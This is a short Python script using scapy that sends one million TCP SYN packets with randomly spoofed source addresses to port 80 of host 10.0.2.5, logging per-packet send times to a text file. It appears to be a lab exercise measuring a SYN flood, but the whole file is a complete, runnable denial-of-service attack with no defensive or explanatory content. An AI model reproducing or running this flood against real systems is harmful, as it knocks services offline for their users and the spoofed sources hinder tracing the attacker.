import random
import socket
import struct
import socket
import sys
import time
from datetime import datetime
from scapy.layers.inet import IP,TCP
from scapy.sendrecv import send



SYN=TCP(sport=40508,dport=80,flags="S",seq=12345)
count=0
avg=0
total=0
first = datetime.now()
f=open("syns_results_p.txt","a+")
ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
myIp=IP(src=ip,dst="10.0.2.5") #ip dest
for i in range(100): #100
    for j in range(10000):#10000
        ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        myIp.src=ip
        time1=datetime.now()
        send(myIp/SYN,verbose=False)
        time=datetime.now()
        diff=time-time1
        howLong=diff.total_seconds()
        count+=1
        f.write(f"Syn request number {count}\nTime it took to send it: {howLong} seconds\n")
        
last=datetime.now()
delta=last-first
totalTime=delta.total_seconds()
avg=totalTime/(count)
f.write(f"\nIt took {totalTime} seconds to send all the packets. The average time to send a packet is {avg} seconds")
f.close()
